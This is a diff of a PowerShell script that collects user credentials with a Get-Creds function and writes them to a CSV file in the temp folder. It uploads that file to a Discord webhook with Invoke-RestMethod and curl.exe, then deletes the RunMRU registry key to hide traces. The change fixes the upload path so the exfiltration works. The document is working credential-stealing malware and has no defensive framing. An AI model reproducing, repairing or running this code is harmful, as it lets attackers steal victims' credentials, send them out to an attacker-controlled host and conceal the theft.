@@ -22,8 +22,6 @@ return $creds
 
 }
 
-
-
 function Upload-Discord {
 
 [CmdletBinding()]
@@ -46,6 +44,9 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
+
+
+
 
 
 
@@ -97,7 +98,7 @@ $creds = Get-Creds
 
 echo $creds >> $env:TMP\$FileName
 
-Upload-discord -file "User-Creds.csv"
+Upload-Discord -file $env:TMP\User-Creds.csv
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
